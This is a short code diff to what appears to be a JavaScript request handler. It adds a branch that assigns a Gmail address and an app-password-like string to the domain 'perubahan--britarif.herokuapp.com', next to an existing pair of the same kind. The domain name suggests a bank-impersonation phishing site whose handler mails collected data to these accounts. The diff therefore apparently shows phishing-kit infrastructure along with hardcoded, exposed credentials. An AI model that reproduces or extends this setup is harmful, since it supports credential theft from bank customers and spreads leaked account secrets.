@@ -48,6 +48,10 @@ export default function handler(req, res) {
         email = 'bossmudaid766@gmail.com';
         pass = 'xvahirtwxvbntkxv';
 
+    } else if(url == 'perubahan--britarif.herokuapp.com'){
+        email = 'dinda00982@gmail.com';
+        pass = 'fubqphjifiatxelf';
+
     }  
         
         try {
